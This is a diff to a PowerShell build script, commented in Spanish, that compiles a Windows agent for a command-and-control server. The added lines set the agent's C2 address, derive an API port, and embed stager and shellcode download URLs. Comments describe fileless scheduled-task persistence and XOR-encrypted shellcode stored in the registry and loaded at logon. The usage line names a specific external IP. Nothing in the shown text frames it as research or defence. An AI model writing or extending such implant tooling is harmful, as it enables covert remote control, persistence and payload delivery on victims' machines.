@@ -3,8 +3,9 @@
 # Uso: .\build-all.ps1 -ServerIP 181.231.253.69 -ServerPort 4444
 
 param(
-    [string]$ServerIP = "127.0.0.1",
+    [string]$ServerIP = "192.168.2.7",
     [int]$ServerPort = 4444,
+    [int]$ApiPort = 0,
     [string]$AgentName = "agent",
     [switch]$Production,
     [switch]$NoCache,
@@ -235,8 +236,11 @@ Write-Color "━━━━━━━━━━━━━━━━━━━━━━�
 Write-Color "📦 [3/3] Compilando agent (Windows x86_64)..." Yellow
 Write-Color "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" Blue
 
+# Derive API port (default: ServerPort + 1111, e.g. 4444 -> 5555)
+if ($ApiPort -eq 0) { $ApiPort = $ServerPort + 1111 }
+
 # Generar config.rs con la IP y puerto del servidor
-Write-Color "⚙️  Configurando agent con C2 server: ${ServerIP}:${ServerPort}" Cyan
+Write-Color "⚙️  Configurando agent con C2 server: ${ServerIP}:${ServerPort} (API: ${ApiPort})" Cyan
 
 # Crear cadena con marcador + IP:PORT + padding nulo (total 96 bytes)
 # Marcador: 32 bytes + Dirección máxima: 64 bytes = 96 bytes total
@@ -273,6 +277,14 @@ pub fn get_c2_server() -> &'static str {
 
 // Para compatibilidad con código existente
 pub const C2_SERVER: &str = "${serverAddress}";
+
+/// URL from which the stager (ester.exe) is served by the C2 server.
+/// Used by fileless scheduled-task persistence to download & re-exec the agent from memory.
+pub const STAGER_URL: &str = "http://${ServerIP}:${ApiPort}/api/stage0/ester";
+
+/// URL from which donut-processed PIC shellcode is served (XOR-encrypted in transit).
+/// Used by auto-persist to download shellcode -> store encrypted in registry -> native loader on logon.
+pub const SHELLCODE_URL: &str = "http://${ServerIP}:${ApiPort}/api/stage0/ester.sc";
 
 "@
 Set-Content -Path "agent\src\config.rs" -Value $configContent -NoNewline
